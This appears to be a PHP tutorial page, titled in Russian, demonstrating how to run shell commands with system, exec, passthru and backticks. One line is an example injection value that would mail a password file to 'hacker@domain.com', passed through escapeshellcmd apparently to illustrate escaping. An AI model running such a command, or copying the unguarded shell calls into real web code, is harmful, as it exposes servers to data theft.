<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Запуск внешних программ</title>
    <meta charset="utf-8">
</head>
<body>
<?php
require_once("../dumper.php");
// echo "<p>".
system("ls /", $pass);
echo "<p>".$pass;

exec("pwd", $array, $pass);
echo "<p>".$pass;
dumper($array);
passthru("cat index.php");

//header("Content-type: text/html");
passthru("../../convert -blur 3 dlN1aebef1FJb5cNNaNy7EPo57-YAnqcP_4r48bzblD5TmlxiwUB7l8U1VmYl6iuVHDSNBpYd4pEWA56QuivU6BJ.jpg -");

$string = `ls -lars ../`;
echo "<p>".$string;

$toDirectory = "sendmail hacker@domain.com </ets/pdw";
echo "<p>".system("cd ".escapeshellcmd($toDirectory));

$tmp = tempnam(".", "tmp");
file_put_contents($tmp, "What do you think I am? Human?");
system("commandToExecute < $tmp");
unlink($tmp);



?>
</body>

</html>
